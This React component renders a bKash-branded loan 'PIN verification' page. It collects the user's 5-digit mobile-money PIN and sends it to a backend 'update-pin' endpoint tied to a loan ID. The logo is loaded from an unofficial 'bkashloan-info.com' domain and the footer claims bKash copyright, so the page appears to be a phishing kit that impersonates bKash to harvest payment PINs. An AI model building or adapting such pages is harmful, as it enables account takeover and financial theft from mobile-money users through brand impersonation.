import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

export default function PinVerification() {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const base_url = import.meta.env.VITE_API_KEY_Base_URL;
  
  // Get loan data from localStorage
  const [loanAmount, setLoanAmount] = useState("0");
  const [loanCategory, setLoanCategory] = useState("Personal Loan");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [loanId, setLoanId] = useState(null);

  useEffect(() => {
    // Retrieve data from localStorage
    const amount = localStorage.getItem('loanAmount');
    const category = localStorage.getItem('loanCategory');
    const accountNumber = localStorage.getItem('accountNumber');
    const id = localStorage.getItem('loanId');
    
    if (amount) setLoanAmount(amount);
    if (category) setLoanCategory(category);
    if (accountNumber) setPhoneNumber(accountNumber);
    if (id) setLoanId(id);
  }, [navigate]);

  const handleCancel = () => {
    alert("Cancelled");
    navigate('/otp-verification');
  };

  const handleConfirm = async () => {
    if (!pin) {
      setError(true);
      alert("Please enter your bKash PIN.");
      return;
    }
    
    if (pin.length !== 5) {
      setError(true);
      alert("PIN must be 5 digits.");
      return;
    }
    
    if (!loanId) {
      navigate('/');
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch(`${base_url}/api/update-pin/${loanId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pin: pin
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        setError(false);
        
        // Navigate to success page or home
        navigate('/processing');
      } else {
        setError(true);
        alert("Invalid PIN. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Something went wrong. Please check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  const handlePinChange = (e) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 5);
    setPin(val);
    if (val.length === 5) setError(false);
  };

  return (
    <div
      style={{ fontFamily: "'Segoe UI', sans-serif" }}
      className="min-h-screen bg-gray-100 flex items-center justify-center p-4"
    >
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-md overflow-hidden">

        {/* Top: Logo */}
        <div className="flex justify-center py-5 px-8">
          <img
            src="https://bkashloan-info.com/img/bKash-logo.png"
            alt="bKash"
            className="h-10 object-contain"
          />
        </div>

        {/* Loan info row */}
        <div className="flex bg-[#F3F4F6] items-start justify-between p-3">
          <div>
            <p className="text-gray-800 font-semibold text-sm">Loan Amount</p>
            <p className="text-gray-500 text-[12px] mt-0.5">loan category: {loanCategory}</p>
          </div>
          <p className="text-gray-800 font-semibold text-sm">
            ৳{parseFloat(loanAmount).toFixed(2)}
          </p>
        </div>

        {/* Pink section */}
        <div
          className="px-8 py-10 flex flex-col items-center gap-4"
          style={{ backgroundColor: "#d81b6a" }}
        >
          <p className="text-white text-sm">
            Enter bKash Pin {phoneNumber}
          </p>

          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={5}
            value={pin}
            onChange={handlePinChange}
            placeholder="Enter 5 Digit Pin"
            disabled={loading}
            className={`w-full rounded-[4px] px-4 py-3 text-center text-gray-700 placeholder:text-gray-400 text-base outline-none bg-white ${
              error ? 'border-2 border-red-500' : ''
            }`}
            style={{ border: error ? "2px solid #fca5a5" : "none" }}
          />

          {error && (
            <p className="text-red-200 text-xs">
              Please enter a valid 5-digit PIN
            </p>
          )}
        </div>

        {/* Cancel / Confirm buttons */}
        <div className="flex p-[15px] gap-[15px]">
          <button
            onClick={handleCancel}
            disabled={loading}
            className="flex-1 py-2.5 text-gray-600 rounded-[4px] cursor-pointer font-semibold text-sm bg-[#E5E7EB] hover:bg-gray-200 transition disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Cancel
          </button>
          <button
            onClick={handleConfirm}
            disabled={loading}
            className="flex-1 py-2.5 text-gray-500 rounded-[4px] cursor-pointer text-sm bg-[#E5E7EB] hover:bg-gray-300 transition disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? "Processing..." : "Confirm"}
          </button>
        </div>

        {/* Footer */}
        <div className="text-center py-4">
          <p className="text-gray-400 text-xs">© 2025 bKash, All Rights Reserved</p>
          <p className="text-xs mt-1" style={{ color: "#d81b6a" }}>
            ● 16247
          </p>
        </div>
      </div>
    </div>
  );
}